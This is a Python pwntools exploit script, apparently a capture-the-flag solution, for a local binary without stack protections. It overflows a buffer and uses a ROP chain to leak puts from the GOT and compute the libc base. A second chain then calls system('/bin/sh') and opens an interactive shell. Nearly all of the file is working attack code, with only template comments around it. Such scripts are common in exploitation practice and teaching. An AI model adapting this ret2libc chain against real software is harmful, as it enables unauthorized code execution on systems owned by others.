#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template bin
from pwn import *
from IPython import embed

# Set up pwntools for the correct architecture
exe = context.binary = ELF('bin')
libc = ELF("./libc6_2.31-0ubuntu9_amd64.so")
ld = ELF("./ld-2.31.so")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def local(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    p = process([ld.path, exe.path] + argv, *a, **kw, env={"LD_PRELOAD": libc.path})
    if args.GDB:
        gdb.attach(p)
    return p

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

p = local()

base = 0x400000

main = exe.symbols['main']
puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
p.success("main address: {}".format(hex(main)))
p.success("puts_plt address: {}".format(hex(puts_plt)))
p.success("puts_got address: {}".format(hex(puts_got)))

p.sendline(cyclic(0x80, n=8))
p.recvall()

core = p.corefile

fault = cyclic_find(core.fault_addr, n=8)

rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

leak_payload = flat({
    fault: [
        pop_rdi,
        puts_got,
        puts_plt,
        main,
        ]
    })

p = local()
p.sendline(leak_payload)

p.recvuntil(('Got: \n', 'Hello, \n'))
p.recvline()
libc_leak = p.recvline()[:-1]
print(libc_leak)

libc.address = u64(libc_leak.ljust(8, b'\x00')) - libc.symbols['puts']
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
p.success("libc address: {}".format(hex(libc.address)))
p.success("/bin/sh address: {}".format(hex(bin_sh)))
p.success("system address: {}".format(hex(system)))

one_gadget = libc.address + 0xe6aee

shell_payload = flat({
    fault: [
        #one_gadget,
        ret,
        pop_rdi,
        bin_sh,
        system,
        ]
    })

p.sendline(shell_payload)

p.interactive()

